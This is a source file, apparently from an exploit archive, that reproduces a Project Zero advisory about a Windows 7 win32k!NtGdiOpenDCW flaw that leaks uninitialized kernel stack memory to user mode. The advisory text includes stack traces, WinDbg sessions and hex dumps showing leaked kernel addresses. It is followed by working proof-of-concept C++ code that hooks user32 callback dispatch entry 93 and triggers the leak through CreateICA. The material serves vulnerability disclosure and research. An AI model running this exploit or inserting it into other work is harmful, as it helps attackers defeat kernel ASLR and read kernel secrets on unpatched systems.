@@ -1,0 +1,184 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1186
+
+We have discovered that it is possible to disclose portions of uninitialized kernel stack memory to user-mode applications in Windows 7 (other platforms untested) indirectly through the win32k!NtGdiOpenDCW system call. The analysis shown below was performed on Windows 7 32-bit.
+
+The full stack trace of where uninitialized kernel stack data is leaked to user-mode is as follows:
+
+--- cut ---
+9706b8b4 82ab667d nt!memcpy+0x35
+9706b910 92bf8220 nt!KeUserModeCallback+0xc6
+9706b954 92c01d1f win32k!pppUserModeCallback+0x23
+9706b970 92c096c8 win32k!ClientPrinterThunk+0x41
+9706ba24 92b0c722 win32k!UMPDDrvEnablePDEV+0x18c
+9706bc20 92b74bc4 win32k!PDEVOBJ::PDEVOBJ+0x1c5
+9706bca4 92b6b2a6 win32k!hdcOpenDCW+0x18c
+9706bd0c 82876db6 win32k!NtGdiOpenDCW+0x112
+9706bd0c 77486c74 nt!KiSystemServicePostCall
+0022fa18 772e9978 ntdll!KiFastSystemCallRet
+0022fa1c 772e9a0e GDI32!NtGdiOpenDCW+0xc
+0022fca8 772e9bab GDI32!hdcCreateDCW+0x1b1
+0022fcf4 772e9c5d GDI32!bCreateDCA+0xe4
+0022fd10 00405114 GDI32!CreateICA+0x18
+--- cut ---
+
+At the time of this callstack, the win32k!ClientPrinterThunk function invokes a user-mode callback #93 (corresponding to user32!__ClientPrinterThunk), and passes in an input structure of 0x6C bytes. We have found that 8 bytes at offset 0x4C and 12 bytes at offset 0x60 of that structure are uninitialized. We have tracked that this structure originates from the stack frame of the win32k!UMPDDrvEnablePDEV function, and is passed down to win32k!UMPDOBJ::Thunk in the 2nd argument.
+
+The uninitialized data can be obtained by a user-mode application by hooking the appropriate entry in the user32.dll callback dispatch table, and reading data from a pointer provided through the handler's parameter. This technique is illustrated by the attached proof-of-concept code (again, specific to Windows 7 32-bit). If we attach a WinDbg debugger to the tested system, we can set a breakpoint at the beginning of win32k!UMPDDrvEnablePDEV, manually initialize the overall structure copied to user-mode with a marker 0x41 ('A') byte after the stack frame allocation instructions, and then observe some of these bytes in the output of the PoC program. This indicates they were not initialized anywhere during execution between win32k!UMPDDrvEnablePDEV and nt!KeUserModeCallback(), and copied in the leftover form to user-mode. See below:
+
+--- cut ---
+1: kd> ba e 1 win32k!UMPDDrvEnablePDEV
+1: kd> g
+Breakpoint 0 hit
+win32k!UMPDDrvEnablePDEV:
+9629957c 6a7c            push    7Ch
+0: kd> p
+win32k!UMPDDrvEnablePDEV+0x2:
+9629957e 68d0633796      push    offset win32k!__safe_se_handler_table+0x7c98 (963763d0)
+0: kd> p
+win32k!UMPDDrvEnablePDEV+0x7:
+96299583 e828b4f8ff      call    win32k!_SEH_prolog4 (962249b0)
+0: kd> p
+win32k!UMPDDrvEnablePDEV+0xc:
+96299588 8d4de4          lea     ecx,[ebp-1Ch]
+0: kd> f ebp-8c ebp-8c+6c-1 41
+Filled 0x6c bytes
+0: kd> g
+--- cut ---
+
+After executing the above commands, the program should print output similar to the following:
+
+--- cut ---
+[...]
+00000000: 6c 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 l...............
+00000010: 1c 03 11 59 d8 e2 31 00 74 02 c6 01 a8 06 c6 01 ...Y..1.t.......
+00000020: 06 00 00 00 00 00 c3 01 30 01 00 00 18 00 c3 01 ........0.......
+00000030: 2c 01 00 00 48 01 c3 01 30 21 a0 ff e4 06 c6 01 ,...H...0!......
+00000040: 84 9b 31 00 00 00 00 00 00 00 00 00 41 41 41 41 ..1.........AAAA
+00000050: 41 41 41 41 74 02 c3 01 74 02 c4 01 74 02 c5 01 AAAAt...t...t...
+00000060: 41 41 41 41 41 41 41 41 41 41 41 41 ?? ?? ?? ?? AAAAAAAAAAAA....
+[...]
+--- cut ---
+
+It's clearly visible that bytes at offsets 0x4c-0x53 and 0x60-0x6b are equal to the data we set in the prologue of win32k!UMPDDrvEnablePDEV, which illustrates how uninitialized stack data is leaked to user-mode.
+
+If we skip the manual initialization of bytes in the stack frame with a kernel debugger, an example output of the program is as follows:
+
+--- cut ---
+00000000: 6c 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 l...............
+00000010: 75 03 11 55 d8 e2 25 00 74 02 96 01 a8 06 96 01 u..U..%.t.......
+00000020: 06 00 00 00 00 00 93 01 30 01 00 00 18 00 93 01 ........0.......
+00000030: 2c 01 00 00 48 01 93 01 30 21 a0 ff e4 06 96 01 ,...H...0!......
+00000040: 84 9b 25 00 00 00 00 00 00 00 00 00[96 6f 89 82]..%..........o..
+00000050:[28 65 9d 84]74 02 93 01 74 02 94 01 74 02 95 01 (e..t...t...t...
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ................
+--- cut ---
+
+In the above listing, two kernel-mode addresses are leaked at offsets 0x4c and 0x50: an address of the ntoskrnl.exe image, and an address of a non-paged pool allocation:
+
+--- cut ---
+0: kd> !address 849d6528
+[...]
+
+Usage:                  
+Base Address:           84800000
+End Address:            84a00000
+Region Size:            00200000
+VA Type:                NonPagedPool
+VAD Address:            0x8800000067317cf2
+Commit Charge:          0x1000165643ec0
+Protection:             0x8800000067317cf0 []
+Memory Usage:           Private
+No Change:              yes
+More info:              !vad 0x84800000
+0: kd> !address 82896f96
+
+
+Usage:                  Module
+Base Address:           8281c000
+End Address:            82c38000
+Region Size:            0041c000
+VA Type:                BootLoaded
+Module name:            ntoskrnl.exe
+Module path:            [\SystemRoot\system32\ntkrnlpa.exe]
+--- cut ---
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+namespace globals {
+  LPVOID (WINAPI *OrigClientPrinterThunk)(LPVOID);
+}  // namespace globals;
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+PVOID *GetUser32DispatchTable() {
+  __asm{
+    mov eax, fs:30h
+    mov eax, [eax + 0x2c]
+  }
+}
+
+BOOL HookUser32DispatchFunction(UINT Index, PVOID lpNewHandler, PVOID *lpOrigHandler) {
+  PVOID *DispatchTable = GetUser32DispatchTable();
+  DWORD OldProtect;
+
+  if (!VirtualProtect(DispatchTable, 0x1000, PAGE_READWRITE, &OldProtect)) {
+    printf("VirtualProtect#1 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  *lpOrigHandler = DispatchTable[Index];
+  DispatchTable[Index] = lpNewHandler;
+
+  if (!VirtualProtect(DispatchTable, 0x1000, OldProtect, &OldProtect)) {
+    printf("VirtualProtect#2 failed, %d\n", GetLastError());
+    return FALSE;
+  }
+
+  return TRUE;
+}
+
+LPVOID WINAPI ClientPrinterThunkHook(LPVOID Data) {
+  printf("----------\n");
+  PrintHex((PBYTE)Data, ((PDWORD)Data)[0]);
+  return globals::OrigClientPrinterThunk(Data);
+}
+
+int main() {
+  if (!HookUser32DispatchFunction(93, ClientPrinterThunkHook, (PVOID *)&globals::OrigClientPrinterThunk)) {
+    return 1;
+  }
+
+  HDC hic = CreateICA("Microsoft XPS Document Writer", "Microsoft XPS Document Writer", NULL, NULL);
+  DeleteDC(hic);
+
+  return 0;
+}
